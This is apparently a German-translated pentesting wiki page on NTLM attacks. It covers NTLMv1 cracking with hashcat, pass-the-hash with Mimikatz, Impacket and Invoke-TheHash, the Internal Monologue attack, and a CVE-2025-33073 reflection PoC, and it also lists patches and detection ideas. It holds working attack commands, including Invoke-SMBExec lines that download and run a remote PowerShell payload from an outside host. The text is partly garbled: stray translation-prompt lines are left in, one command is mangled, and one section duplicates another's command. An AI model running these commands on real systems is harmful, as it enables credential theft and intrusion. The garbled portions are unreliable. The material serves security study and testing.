# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

In Umgebungen, in denen **Windows XP und Server 2003** betrieben werden, werden LM-(Lan-Manager-)Hashes verwendet, obwohl allgemein bekannt ist, dass diese leicht kompromittiert werden können. Ein bestimmter LM-Hash, `AAD3B435B51404EEAAD3B435B51404EE`, weist darauf hin, dass LM nicht verwendet wird, und stellt den Hash für eine leere Zeichenkette dar.

Standardmäßig wird das Authentifizierungsprotokoll **Kerberos** als primäre Methode verwendet. NTLM (NT LAN Manager) kommt unter bestimmten Umständen zum Einsatz: wenn Active Directory nicht vorhanden ist, die Domäne nicht existiert, Kerberos aufgrund einer fehlerhaften Konfiguration nicht funktioniert oder wenn Verbindungen über eine IP-Adresse statt über einen gültigen Hostnamen hergestellt werden.

Das Vorhandensein des Headers **"NTLMSSP"** in Netzwerkpaketen weist auf einen NTLM-Authentifizierungsprozess hin.

Die Unterstützung der Authentifizierungsprotokolle - LM, NTLMv1 und NTLMv2 - wird durch eine bestimmte DLL unter `%windir%\Windows\System32\msv1\_0.dll` ermöglicht.

**Wichtige Punkte**:

- LM-Hashes sind anfällig, und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) weist darauf hin, dass LM nicht verwendet wird.
- Kerberos ist die standardmäßige Authentifizierungsmethode, während NTLM nur unter bestimmten Bedingungen verwendet wird.
- NTLM-Authentifizierungspakete sind am Header "NTLMSSP" erkennbar.
- Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.

## LM, NTLMv1 und NTLMv2

Sie können überprüfen und konfigurieren, welches Protokoll verwendet wird:

### GUI

Führen Sie _secpol.msc_ aus -> Lokale Richtlinien -> Sicherheitsoptionen -> Netzwerksicherheit: LAN-Manager-Authentifizierungsebene. Es gibt 6 Ebenen (von 0 bis 5).

![LM, NTLMv1 und NTLMv2 - GUI: secpol.msc ausführen - Lokale Richtlinien - Sicherheitsoptionen - Netzwerksicherheit: LAN-Manager-Authentifizierungsebene. Es gibt 6 Ebenen (von 0 bis 5)](<../../images/image (919).png>)

### Registry

Damit wird Ebene 5 festgelegt:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Mögliche Werte:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Grundlegendes NTLM Domain authentication Scheme

1. Der **Benutzer** gibt seine **credentials** ein.
2. Die Clientmaschine **sendet eine authentication request**, die den **domain name** und den **username** enthält.
3. Der **server** sendet die **challenge**.
4. Der **client verschlüsselt** die **challenge** unter Verwendung des Passwort-Hashs als Schlüssel und sendet sie als response.
5. Der **server sendet** den **domain name, den username, die challenge und die response** an den **Domain Controller**. Falls **kein Active Directory konfiguriert ist** oder der domain name dem Namen des Servers entspricht, werden die credentials **lokal überprüft**.
6. Der **Domain Controller überprüft, ob alles korrekt ist**, und sendet die Informationen an den Server.

Der **server** und der **Domain Controller** können über den **Netlogon**-Server einen **Secure Channel** erstellen, da der Domain Controller das Passwort des Servers kennt (es befindet sich in der **NTDS.DIT**-Datenbank).

### Lokales NTLM authentication Scheme

Die authentication entspricht der oben erwähnten, **aber** der **server** kennt den **Hash des Benutzers**, der versucht, sich zu authentifizieren, in der **SAM**-Datei. Anstatt also den Domain Controller zu fragen, **überprüft der server selbst**, ob sich der Benutzer authentifizieren kann.

### NTLMv1 Challenge

Die **Länge der challenge beträgt 8 Bytes** und die **response ist 24 Bytes** lang.

Der **NT-Hash (16 Bytes)** wird in **3 Teile zu jeweils 7 Bytes** aufgeteilt (7B + 7B + (2B+0x00\*5)): Der **letzte Teil wird mit Nullen aufgefüllt**. Anschließend wird die **challenge** separat mit jedem Teil **verschlüsselt** und die **verschlüsselten** Ergebnis-Bytes werden **zusammengefügt**. Gesamt: 8B + 8B + 8B = 24 Bytes.

**Probleme**:

- Fehlende **Zufälligkeit**
- Die 3 Teile können **separat angegriffen** werden, um den NT-Hash zu ermitteln.
- **DES ist knackbar**
- Der 3. Schlüssel besteht immer aus **5 Nullen**.
- Bei derselben **challenge** ist die **response immer gleich**. Daher kann man dem Opfer die Zeichenfolge "**1122334455667788**" als **challenge** senden und die response mithilfe **vorberechneter Rainbow Tables** angreifen.

### NTLMv1 attack

Unconstrained delegation ist in modernen Umgebungen weniger verbreitet, aber ein erreichbarer **Print Spooler service** kann weiterhin missbraucht werden, um eine authentication zu einem solchen Host zu erzwingen.

Du könntest einige credentials/Sessions, die du bereits in der AD hast, missbrauchen, um **den Drucker aufzufordern, sich bei einem Host unter deiner Kontrolle zu authentifizieren**. Anschließend kannst du mit `metasploit auxiliary/server/capture/smb` oder `responder` die **authentication challenge auf 1122334455667788 setzen**, den authentication attempt erfassen und, falls NTLMv1 verwendet wurde, **sie cracken**.\
Wenn du `responder` verwendest, könntest du versuchen, das **Flag `--lm` zu verwenden**, um die **authentication** herabzustufen.\
_Beachte, dass für diese Technik die authentication mit NTLMv1 durchgeführt werden muss (NTLMv2 ist nicht gültig)._

Denke daran, dass der Drucker während der authentication das Computerkonto verwendet und Computerkonten **lange und zufällige Passwörter** verwenden, die du mit gewöhnlichen **Dictionaries** **wahrscheinlich nicht cracken** kannst. Die **NTLMv1** authentication **verwendet jedoch DES** ([weitere Informationen hier](#ntlmv1-challenge)); daher kannst du es mit speziellen Diensten zum Cracken von DES cracken (du könntest beispielsweise [https://crack.sh/](https://crack.sh) oder [https://ntlmv1.com/](https://ntlmv1.com) verwenden).

### NTLMv1 attack with hashcat

NTLMv1 kann auch mit [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) angegriffen werden, das erfasste NTLMv1-Nachrichten in für Hashcat geeignete Formate konvertiert.<sup>[[1]](#references)</sup>

Der Befehl
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the English Markdown text to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Führe hashcat aus (verteilt am besten über ein Tool wie hashtopolis), da dies andernfalls mehrere Tage dauern wird.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In diesem Fall kennen wir das Passwort dafür: password, daher werden wir zu Demonstrationszwecken schummeln:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Nun müssen wir die hashcat-utilities verwenden, um die geknackten DES-Schlüssel in Teile des NTLM-Hashes umzuwandeln:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Bitte sende den letzten Abschnitt, den ich ins Deutsche übersetzen soll.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Die **Länge der Challenge beträgt 8 Bytes** und es werden **2 Responses gesendet**: Eine ist **24 Bytes** lang und die Länge der **anderen** ist **variabel**.

**Die erste Response** wird erstellt, indem der aus **Client und Domain** zusammengesetzte **String** mit **HMAC_MD5** verschlüsselt wird, wobei der **MD4-Hash** des **NT-Hashs** als **Key** verwendet wird. Anschließend wird das **Ergebnis** als **Key** verwendet, um die **Challenge** mit **HMAC_MD5** zu verschlüsseln. Dazu wird eine **Client-Challenge von 8 Bytes** hinzugefügt. Insgesamt: 24 B.

**Die zweite Response** wird unter Verwendung **mehrerer Werte** erstellt (einer neuen Client-Challenge, eines **Timestamps**, um **Replay-Angriffe** zu verhindern ...).

Wenn du einen **PCAP mit einem erfolgreichen Authentication-Austausch** hast, extrahiere die Domain, den Username, die Server-Challenge und die NTLMv2-Response, formatiere den Mitschnitt für Hashcat und verwende den Modus `5600`, um eine Password-Recovery zu versuchen. Die archivierte praktische Anleitung enthält weiterhin das Verfahren zum Extrahieren der Paketfelder, während die Beispiele von Hashcat das aktuell akzeptierte Format definieren.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Sobald du den Hash des Opfers hast**, kannst du ihn verwenden, um es zu **imitieren**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung unter Verwendung** dieses **Hashs** **durchführt**, oder du kannst eine neue **sessionlogon** erstellen und diesen **Hash** in **LSASS** **injizieren**, sodass dieser **Hash verwendet wird**, wenn irgendeine **NTLM-Authentifizierung durchgeführt wird**. Die letzte Option verwendet mimikatz.

**Bitte beachte, dass du Pass-the-Hash-Angriffe auch mit Computer-Accounts durchführen kannst.**

### **Mimikatz**

**Muss als Administrator ausgeführt werden**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dies startet einen Prozess unter dem aktuell angemeldeten lokalen Benutzer, während LSASS die bereitgestellten Anmeldedaten mit dessen ausgehender Netzwerk-Anmeldung verknüpft. Anschließend können Sie als der bereitgestellte Benutzer auf Netzwerkressourcen zugreifen, ähnlich wie mit `runas /netonly`, ohne das Klartextpasswort zu kennen.

### Pass-the-Hash von Linux

Sie können mithilfe von Pass-the-Hash von Linux aus Codeausführung auf Windows-Computern erlangen.\
[**Praktische Beispiele für die Ausführung von Pass-the-Hash ansehen.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Kompilierte Impacket-Tools für Windows

Sie können [hier Impacket-Binärdateien für Windows herunterladen](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In diesem Fall müssen Sie einen Befehl angeben; cmd.exe und powershell.exe sind nicht gültig, um eine interaktive Shell zu erhalten)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Es gibt noch mehrere weitere Impacket-Binärdateien ...

### Invoke-TheHash

Die PowerShell-Skripte erhalten Sie hier: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Diese Funktion kombiniert die vorherigen Modi. Du kannst **mehrere Hosts** angeben, ausgewählte Ziele ausschließen und _SMBExec, WMIExec, SMBClient,_ oder _SMBEnum_ auswählen. Wenn du **SMBExec** oder **WMIExec** ohne einen _**Command**_-Parameter auswählst, wird lediglich geprüft, ob du über ausreichende Berechtigungen verfügst.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Muss als Administrator ausgeführt werden**

Dieses Tool macht dasselbe wie mimikatz (Ändern des LSASS-Speichers).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manuelle Windows-Remoteausführung mit Benutzername und Passwort


{{#ref}}
../lateral-movement/
{{#endref}}

## Extrahieren von Anmeldedaten von einem Windows-Host

Weitere Informationen finden Sie unter [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

Der Internal Monologue Attack ist eine unauffällige Technik zur Extraktion von Anmeldedaten, mit der ein Angreifer NTLM-Hashes vom Computer eines Opfers abrufen kann, **ohne direkt mit dem LSASS-Prozess zu interagieren**. Im Gegensatz zu Mimikatz, das Hashes direkt aus dem Speicher liest und häufig von Endpoint-Security-Lösungen oder Credential Guard blockiert wird, nutzt dieser Angriff **lokale Aufrufe an das NTLM authentication package (MSV1_0) über die Security Support Provider Interface (SSPI)**. Der Angreifer **setzt zunächst die NTLM-Einstellungen herab** (z. B. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), um sicherzustellen, dass NetNTLMv1 zugelassen ist. Anschließend nimmt er die Identität vorhandener Benutzer-Tokens an, die aus laufenden Prozessen stammen, und löst lokal eine NTLM-Authentifizierung aus, um NetNTLMv1-Antworten unter Verwendung einer bekannten Challenge zu erzeugen.<sup>[[4]](#references)</sup>

Nach dem Erfassen dieser NetNTLMv1-Antworten kann der Angreifer die ursprünglichen NTLM-Hashes mithilfe **vorberechneter Rainbow Tables** schnell wiederherstellen und dadurch weitere Pass-the-Hash-Angriffe für Lateral Movement durchführen. Entscheidend ist, dass der Internal Monologue Attack unauffällig bleibt, da er keinen Netzwerkverkehr erzeugt, keinen Code injiziert und keine direkten Memory Dumps auslöst. Dadurch ist er für Verteidiger schwerer zu erkennen als herkömmliche Methoden wie Mimikatz.

Wenn NetNTLMv1 aufgrund erzwungener Sicherheitsrichtlinien nicht akzeptiert wird, kann der Angreifer möglicherweise keine NetNTLMv1-Antwort abrufen.

Um diesen Fall zu behandeln, wurde das Internal Monologue-Tool aktualisiert: Es erwirbt dynamisch ein Server-Token mithilfe von `AcceptSecurityContext()`, um weiterhin **NetNTLMv2-Antworten zu erfassen**, falls NetNTLMv1 fehlschlägt. Obwohl NetNTLMv2 wesentlich schwerer zu knacken ist, eröffnet es weiterhin einen Weg für Relay-Angriffe oder Offline-Brute-Force-Angriffe in begrenzten Fällen.

Der PoC ist unter **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** zu finden.<sup>[[4]](#references)</sup>

## NTLM Relay und Responder

**Eine ausführlichere Anleitung zur Durchführung dieser Angriffe finden Sie hier:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## NTLM-Challenges aus einem Network Capture analysieren

**Sie können** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **verwenden**

## NTLM- und Kerberos-*Reflection* über serialisierte SPNs (CVE-2025-33073)

Windows enthält mehrere Schutzmaßnahmen, die versuchen, *Reflection*-Angriffe zu verhindern, bei denen eine NTLM- oder Kerberos-Authentifizierung, die von einem Host ausgeht, an **denselben** Host zurückgeleitet wird, um SYSTEM-Rechte zu erlangen.

Microsoft unterband die meisten öffentlichen Chains mit MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) und späteren Patches. **CVE-2025-33073** zeigt jedoch, dass die Schutzmaßnahmen weiterhin umgangen werden können, indem ausgenutzt wird, wie der **SMB-Client Service Principal Names (SPNs) abschneidet**, die *marshalled* (serialisierte) Target-Informationen enthalten.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR des Bugs
1. Ein Angreifer registriert einen **DNS-A-Record**, dessen Label einen marshalled SPN codiert – z. B.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Das Opfer wird dazu gebracht, sich bei diesem Hostnamen zu authentifizieren (PetitPotam, DFSCoerce usw.).
3. Wenn der SMB-Client den Target-String `cifs/srv11UWhRCAAAAA…` an `lsasrv!LsapCheckMarshalledTargetInfo` übergibt, **entfernt** der Aufruf von `CredUnmarshalTargetInfo` den serialisierten Blob, sodass **`cifs/srv1`** übrig bleibt.
4. `msv1_0!SspIsTargetLocalhost` (oder das Kerberos-Äquivalent) betrachtet das Target nun als *localhost*, da der kurze Host-Teil mit dem Computernamen (`SRV1`) übereinstimmt.
5. Folglich setzt der Server `NTLMSSP_NEGOTIATE_LOCAL_CALL` und injiziert das **SYSTEM-Access-Token von LSASS** in den Context (bei Kerberos wird ein mit SYSTEM markierter Subsession-Key erstellt).
6. Das Relaying dieser Authentifizierung mit `ntlmrelayx.py` **oder** `krbrelayx.py` gewährt vollständige SYSTEM-Rechte auf demselben Host.<sup>[[5]](#references)</sup>

### Schneller PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patches & Gegenmaßnahmen
* Der KB-Patch für **CVE-2025-33073** fügt in `mrxsmb.sys::SmbCeCreateSrvCall` eine Prüfung hinzu, die jede SMB-Verbindung blockiert, deren Ziel marshalled info enthält (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* **SMB signing** erzwingen, um Reflection auch auf ungepatchten Hosts zu verhindern.
* DNS-Einträge überwachen, die wie `*<base64>...*` aussehen, und coercion vectors (PetitPotam, DFSCoerce, AuthIP...) blockieren.

### Detection-Ideen
* Netzwerkaufzeichnungen mit `NTLMSSP_NEGOTIATE_LOCAL_CALL`, bei denen sich Client-IP und Server-IP unterscheiden.
* Kerberos AP-REQ mit einem subsession key und einem Client-principal, der dem Hostnamen entspricht.
* Windows-Events 4624/4648 mit SYSTEM-Logons, auf die unmittelbar danach remote SMB writes vom selben Host folgen.<sup>[[5]](#references)</sup>

Für die **März-2026**-Variante von local reflection, die **SMB arbitrary ports** und **TCP connection reuse** missbraucht, um `NT AUTHORITY\SYSTEM` zu erreichen, siehe:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat-Beispiel-Hashes – NetNTLMv2 (Modus 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass-The-Hash-Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal-Monologue-Angriff: NTLM-Hashes abrufen, ohne LSASS zu berühren](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection ist tot, lang lebe NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Einen NTLMv2-Hash knacken – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
